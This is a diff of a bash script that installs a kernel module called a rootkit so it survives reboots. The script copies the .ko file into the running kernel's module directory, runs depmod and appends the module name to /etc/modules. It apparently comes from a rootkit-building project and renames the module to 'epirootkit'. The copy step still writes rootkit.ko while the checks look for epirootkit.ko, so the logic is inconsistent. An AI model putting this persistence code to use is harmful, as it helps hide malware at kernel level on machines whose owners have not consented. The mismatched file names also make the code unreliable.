@@ -9,20 +9,20 @@ set -euo pipefail
 
 MOD_PATH="/lib/modules/$(uname -r)/kernel/lib"
 # Check if we're already persistent
-if [[ -f "$MOD_PATH/rootkit.ko" ]] && grep -q "^rootkit$" /etc/modules; then
+if [[ -f "$MOD_PATH/epirootkit.ko" ]] && grep -q "^epirootkit$" /etc/modules; then
   # nothing to do here
   echo "all good"
   exit 0
 fi
 
-if [[ ! -f "$MOD_PATH/rootkit.ko" ]]; then
+if [[ ! -f "$MOD_PATH/epirootkit.ko" ]]; then
   # nothing to do here
   echo "copying module to lib"
   cp /rootkit/persist/rootkit.ko "$MOD_PATH"
   depmod -a
 fi
 
-if ! grep -q "^rootkit$" "/etc/modules" ; then
+if ! grep -q "^epirootkit$" "/etc/modules" ; then
   echo "adding module to kmod list"
-  echo 'rootkit' >> /etc/modules
+  echo 'epirootkit' >> /etc/modules
 fi
